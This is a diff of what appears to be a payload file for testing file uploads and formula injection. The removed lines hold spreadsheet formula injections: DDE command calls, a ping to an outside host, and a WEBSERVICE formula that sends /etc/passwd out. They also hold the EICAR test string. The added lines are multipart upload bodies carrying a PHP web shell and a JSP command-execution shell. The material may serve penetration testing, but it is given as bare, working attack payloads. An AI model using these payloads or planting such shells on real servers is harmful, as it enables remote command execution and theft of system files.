@@ -1,4 +1,50 @@
-=cmd|' /C notepad'!'A1'
-=cmd|' /C ping 222@test.gwjd.bid'!'A1'
-=WEBSERVICE(CONCATENATE("http://:8080/",('file:///etc/passwd'#$passwd.A1)))
-X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+------WebKitFormBoundaryzSjOrNy9MBg24nn7
+Content-Disposition: form-data; name="file"; filename="test2.php"
+Content-Type: application/octet-stream
+
+<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+------WebKitFormBoundaryzSjOrNy9MBg24nn7--
+
+
+
+------WebKitFormBoundarybFBIeS70tRNHl16T
+Content-Disposition: form-data; name="file"; filename="test3.jsp"
+Content-Type: application/octet-stream
+
+<%@ page import="java.util.*,java.io.*"%>
+<%
+//
+// JSP_KIT
+//
+// cmd.jsp = Command Execution (unix)
+//
+// by: Unknown
+// modified: 27/06/2003
+//
+%>
+<HTML><BODY>
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+<%
+if (request.getParameter("cmd") != null) {
+        out.println("Command: " + request.getParameter("cmd") + "<BR>");
+        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+        OutputStream os = p.getOutputStream();
+        InputStream in = p.getInputStream();
+        DataInputStream dis = new DataInputStream(in);
+        String disr = dis.readLine();
+        while ( disr != null ) {
+                out.println(disr); 
+                disr = dis.readLine(); 
+                }
+        }
+%>
+</pre>
+</BODY></HTML>
+
+
+
+------WebKitFormBoundarybFBIeS70tRNHl16T--
